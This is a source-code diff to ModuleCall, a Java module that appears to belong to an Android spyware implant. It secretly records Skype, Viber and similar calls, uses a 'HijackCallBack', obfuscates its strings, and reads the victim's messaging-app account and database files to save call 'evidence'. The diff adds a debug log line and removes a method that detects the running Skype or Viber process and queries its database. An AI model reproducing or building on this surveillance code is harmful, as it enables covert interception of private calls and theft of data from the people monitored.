@@ -671,6 +671,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	// sec_length: call length in seconds
 	// type: call type (Skype, Viber, Paltalk, Hangout)
 	public synchronized void encodeChunks(AutoFile file) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (encodeChunks), " + file);
+		}
 		int first_epoch, last_epoch;
 		AudioEncoder audioEncoder = new AudioEncoder(file.getFilename());
 
@@ -767,7 +770,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			// We have an end of call and it's on both channels
 			if (audioEncoder.isLastCallFinished()) {
-
 				finished[remote ? 1 : 0] = true;
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (encodeChunks) finished: [" + finished[0] + "," + finished[1] + "]");
@@ -864,67 +866,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + " (saveAllEvidences) saving last chunk");
 		}
 		closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
-	}
-
-	private boolean updateCallInfo(CallInfo callInfo, boolean end) {
-
-		// RunningAppProcessInfo fore = runningProcesses.getForeground();
-		if (callInfo.valid) {
-			return true;
-		}
-
-		ListenerProcess lp = ListenerProcess.self();
-
-		if (lp.isRunning(M.e("com.skype.raider"))) {
-			if (end) {
-				return true;
-			}
-			callInfo.processName = M.e("com.skype.raider");
-			// open DB
-			String account = ChatSkype.readAccount();
-			callInfo.account = account;
-			callInfo.programId = 0x0146;
-			callInfo.delay = false;
-			callInfo.realRate = false;
-
-			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
-
-			boolean ret = false;
-			if (helper != null) {
-				ret = ChatSkype.getCurrentCall(helper, callInfo);
-			}
-
-			return ret;
-		} else if (lp.isRunning(M.e("com.viber.voip"))) {
-			boolean ret = false;
-			callInfo.processName = M.e("com.viber.voip");
-			callInfo.delay = true;
-			callInfo.realRate = true;
-
-			// open DB
-			callInfo.programId = 0x0148;
-			if (end) {
-				String account = ChatViber.readAccount();
-				callInfo.account = account;
-				GenericSqliteHelper helper = ChatViber.openViberDBHelperCall();
-
-				if (helper != null) {
-					ret = ChatViber.getCurrentCall(helper, callInfo);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (updateCallInfo) id: " + callInfo.id);
-				}
-			} else {
-				callInfo.account = M.e("delay");
-				callInfo.peer = M.e("delay");
-				ret = true;
-			}
-
-			return ret;
-
-		}
-		return false;
 	}
 
 	public class HijackCallBack implements ICallBack {
